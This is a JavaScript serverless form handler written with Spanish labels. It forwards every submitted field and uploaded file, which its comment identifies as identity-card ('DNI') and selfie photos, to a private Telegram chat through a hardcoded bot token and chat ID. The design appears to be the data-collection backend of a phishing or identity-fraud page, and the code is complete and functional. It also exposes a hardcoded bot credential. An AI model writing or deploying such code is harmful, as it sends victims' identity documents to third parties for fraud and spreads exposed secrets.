export async function onRequestPost(context) {
  try {
    const formData = await context.request.formData();
    const TELEGRAM_TOKEN = '8908561587:AAHSEA4yx5ZSaxfDnu0HMiQAZ5XgS6oR46E';
    const TELEGRAM_CHAT_ID = '1954226433';

    let textoMensaje = "📌 *NUEVO REGISTRO RECIBIDO*\n\n";
    const archivos = [];

    // Separar datos de texto y archivos adjuntos
    for (let [key, value] of formData.entries()) {
      if (typeof value === 'object' && value.name && value.size > 0) {
        archivos.push({ campo: key, archivo: value });
      } else if (typeof value === 'string' && value.trim() !== '') {
        textoMensaje += `• *${key}:* ${value}\n`;
      }
    }

    // 1. Enviar los datos de texto
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: textoMensaje,
        parse_mode: 'Markdown'
      })
    });

    // 2. Enviar los archivos adjuntos (DNI / Selfie) como fotos
    for (const item of archivos) {
      const photoFormData = new FormData();
      photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
      photoFormData.append('caption', `📷 Adjunto: ${item.campo}`);
      photoFormData.append('photo', item.archivo, item.archivo.name);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: photoFormData
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}
